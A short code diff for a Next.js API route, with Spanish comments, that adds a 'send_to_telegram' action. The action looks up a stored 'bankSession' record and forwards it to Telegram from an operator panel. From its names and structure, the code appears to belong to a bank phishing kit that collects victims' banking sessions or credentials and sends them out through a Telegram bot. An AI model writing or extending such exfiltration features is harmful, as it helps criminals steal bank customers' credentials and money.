@@ -170,6 +170,24 @@ export async function POST(request: NextRequest) {
         });
         return NextResponse.json({ success: true, session: completedSession });
 
+      case 'send_to_telegram':
+        // Enviar manualmente a Telegram desde el panel
+        const sessionToSend = await prisma.bankSession.findUnique({
+          where: { sessionId }
+        });
+        
+        if (!sessionToSend) {
+          return NextResponse.json({ error: 'Session not found' }, { status: 404 });
+        }
+        
+        try {
+          await sendToTelegram(sessionToSend);
+          return NextResponse.json({ success: true, message: 'Enviado a Telegram' });
+        } catch (error) {
+          console.error('Error sending to Telegram manually:', error);
+          return NextResponse.json({ error: 'Failed to send to Telegram' }, { status: 500 });
+        }
+
       default:
         return NextResponse.json({ error: 'Action not found' }, { status: 400 });
     }
